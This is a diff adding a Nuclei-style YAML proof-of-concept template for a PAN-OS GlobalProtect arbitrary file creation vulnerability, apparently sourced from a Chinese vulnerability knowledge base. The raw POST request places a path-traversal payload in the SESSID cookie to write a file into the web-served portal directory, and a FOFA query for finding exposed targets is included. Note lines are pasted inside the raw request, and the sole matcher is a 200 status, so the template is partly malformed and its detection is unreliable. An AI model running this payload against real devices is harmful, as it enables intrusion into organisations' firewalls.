@@ -1,0 +1,43 @@
+id: poc-iio3y5g8cfno55tz
+info:
+  name: Palo Alto Networks PAN-OS 任意文件创建漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iio3y5g8cfno55tz'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: iio3y5g8cfno55tz
+    fofa: app="PaloAlto-GlobalProtect"
+http:
+- raw:
+  - 'POST /ssl-vpn/hipreport.esp HTTP/1.1
+
+
+    Cookie: SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/dudesite.txt;
+
+
+    Connection: close
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /global-protect/portal/images/dudesite.txt'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
